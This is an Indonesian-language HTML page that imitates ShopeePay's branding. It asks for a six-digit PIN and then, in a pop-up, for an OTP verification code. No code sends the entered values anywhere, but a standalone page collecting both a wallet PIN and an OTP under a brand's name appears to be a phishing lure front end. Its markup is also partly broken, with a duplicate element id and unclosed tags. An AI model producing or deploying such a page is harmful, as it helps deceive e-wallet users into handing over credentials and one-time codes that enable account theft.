
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Form PIN ShopeePay</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      text-align: center;
      background-color: #fff;
    }
    .container {
      max-width: 400px;
      margin: auto;
      padding: 20px;
    }
    .logo {
      color: #ee4d2d;
      font-size: 24px;
      font-weight: bold;
    }
    .title {
      font-size: 20px;
      margin: 20px 0;
    }
    .pin-input {
      display: flex;
      justify-content: space-between;
      margin: 20px 0;
    }
    .pin-input input {
      width: 48px;
      height: 60px;
      font-size: 24px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .note {
      font-size: 16px;
      color: #666;
      margin-top: 20px;
    }
    .btn {
      background-color: #ee4d2d;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 6px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 20px;
    }

    /* Pop-up styling */
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 60px;
      border-radius: 6px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
      z-index: 1000;
      display: none;
      max-width: 500px;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 999;
      display: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">ShopeePay</div>
    <div class="title">Masukan PIN ShopeePay</div>
    <form>
      <div class="pin-input">
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
        <input type="password" maxlength="1" />
      </div>
      <button type="button" class="btn" onclick="showPopup()">
          Lanjutkan
      </button>
    </form>
    <div class="note">
      Demi keamanan, hindari angka beruntun atau berulang.<br>
      Jangan gunakan tanggal lahir kamu atau keluargamu, maupun PIN ATM sebagai PIN ShopeePay.
    </div>
  </div>

  <!-- Overlay + Pop-up -->
  <div class="overlay" id="overlay" onclick="hidePopup()"></div>
  <div class="popup" id="popup">
    <p> 
    
    <!-- Modal -->

<div id="popup" class="fixed inset-4 flex items-center justify-center bg-black bg-opacity-80 hidden">

  <div 
  class="bg-white px-6 rounded-lg shadow-lg max-width-sm w-full">

 
    <h3 class="text-lg font-semibold mb-6">Verifikasi </h3>
    
    <p 
    class="text-sm text-gray-600 mb-40">Kode verifikasi telah dikirim ke nomor Anda.
    <div>
        
    <input type="number" placeholder="Masukkan kode OTP" class="text-gray-600 px-6 py-6 focus:outline-6">
    <button onclick="closePopup()" class="justify-centerfull bg-orange-600 text-white py-20 rounded-md hover:bg-white-700">
  </div></p>
    <button class="btn" onclick="hidePopup()">
        Konfirmasi
        </button>
  </div>

  <script>
    function showPopup() {
      document.getElementById("overlay").style.display = "block";
      document.getElementById("popup").style.display = "block";
    }

    function hidePopup() {
      document.getElementById("overlay").style.display = "none";
      document.getElementById("popup").style.display = "none";
    }

    // Auto move to next input
    const inputs = document.querySelectorAll('.pin-input input');
    inputs.forEach((input, i) => {
      input.addEventListener('input', () => {
        if (input.value && i < inputs.length - 1) {
          inputs[i + 1].focus();
        }
      });
    });
  </script>
</body>
</html>
